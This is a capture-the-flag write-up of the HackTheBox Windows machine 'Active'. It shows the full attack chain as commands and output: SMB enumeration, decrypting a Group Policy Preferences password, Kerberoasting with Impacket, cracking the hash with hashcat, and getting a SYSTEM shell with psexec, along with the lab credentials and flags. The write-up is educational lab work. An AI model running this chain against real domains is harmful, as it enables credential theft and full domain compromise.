
---
title: "Active"
summary: "Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment. This machine teaches us about Group Policy Preferences Passwords from Windows and how to abuse them."
categories: ["Post","Blog",]
tags: ["post","hackthebox","windows"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2025-01-06

---

| Machine Info         |              |
| -------------------- | ------------ |
| **Platform**         | HackTheBox   |
| **Operative System** | Windows      |
| **Difficulty**       | Easy         |
| **IP**               | 10.10.10.100 |
- - -
## Enumeration

Let's begin the enumeration with `Nmap`:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.100 -oN ports

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-04 18:47:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-04T18:48:37
|_  start_date: 2025-01-04T18:21:40
|_clock-skew: -1s
```

There are quite a few ports open. We can begin the enumeration by checking if there is any information on **SMB** shares:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ smbclient -N -L \\10.10.10.100 

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      

```

The _Replication_ share has some info that we can access:

```bash
smb: \> ls

  active.htb                          D        0  Sat Jul 21 00:37:44 2018
```

- - -
## Credential Gathering
We discover a password on `Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml`.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ cat Groups.xml 

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

The file **Groups.xml** is automatically created on the `SYSVOL` share when a _Group Policy Preference_ is created. The file contains Groups related information, even passwords. These are encrypted with a private key from Microsoft, but it was published by accident.

This is quite old (from around 2014) but is great knoledge to have, as if a system contains old files wich contain a password encrypted from a _Group Policy Preference_, it can be decripted with the tool `gpp-decrypt`.

```bash
┌──(s3n㉿kali)-[~]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

After finding the password for the _SVC_TGS_ user, we should take a look of the shares that we couldn't access, such as **Users**, to check if we obtained any privilege on it.

```bash
┌──(s3n㉿kali)-[~]
└─$ smbclient \\\\10.10.10.100\\Users -W active.htb -U SVC_TGS 
Password for [ACTIVE.HTB\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 04:39:20 2018
  ..                                 DR        0  Sat Jul 21 04:39:20 2018
  Administrator                       D        0  Mon Jul 16 00:14:21 2018
  All Users                       DHSrn        0  Mon Jul 13 19:06:44 2009
  Default                           DHR        0  Mon Jul 13 20:38:21 2009
  Default User                    DHSrn        0  Mon Jul 13 19:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 18:57:55 2009
  Public                             DR        0  Mon Jul 13 18:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 05:16:32 2018
```

It looks like it worked! We enumerate again but we don't find anything relevant.

>We could claim the user flag in the SVC_TGS/Desktop directory but I won't do it, as it wouldn't count in exams like OSCP, as you need an interactive shell.

With user _SVC_TGS_ it seems that we don't have a way of getting a foothold on the machine as I tried to RDP. However, we can continue enumerating the internal network as we have valid credentials with this user.

- - -
## Kerberoasting
**Kerberoasting** is a post-exploitation technique we can use when assessing Active Directory (AD) environments. The objective is to obtain the password hash of a service account associated with a _Service Principal Name_ (SPN). SPNs are attributes in AD that uniquely tie a service to a user account, enabling Kerberos authentication.

In this scenario, as authenticated domain users, we request a Kerberos service ticket for an SPN. The domain controller generates the ticket and encrypts it using the NTLM hash of the service account password linked to the SPN. This ticket is then provided to us. At this stage, we don’t require elevated privileges—just a valid domain user account to request the ticket.

Once we retrieve the encrypted ticket, we can crack it offline using tools like `Hashcat`. If successful, we recover the plaintext password of the service account.

We can try to check for users SPNs with Impacket's `GetUserSPN` tool:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon/Users_Share]
└─$ sudo impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 09:06:40.351723  2025-01-04 08:22:56.876969             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8
```

Nice! We got the Now, we can try to crack this hash with `hashcat`:

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8:Ticketmaster1968
```

We found Administrator's password with value **Ticketmaster1968**. We can try to abuse SMB to stablish a shell with `psexec`:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ impacket-psexec Administrator@10.10.10.100        
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file zOdNJqkf.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service ROhE on 10.10.10.100.....
[*] Starting service ROhE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Now we can read both flags:

```powershell
C:\> type C:\Users\SVC_TGS\Desktop\user.txt  
40538eb1a29a0cef0b8d9a4d7a3a387f
```

```powershell
C:\> type C:\Users\Administrator\Desktop\root.txt
b8737ca7bc28f8b9dcce856e5226956d
```


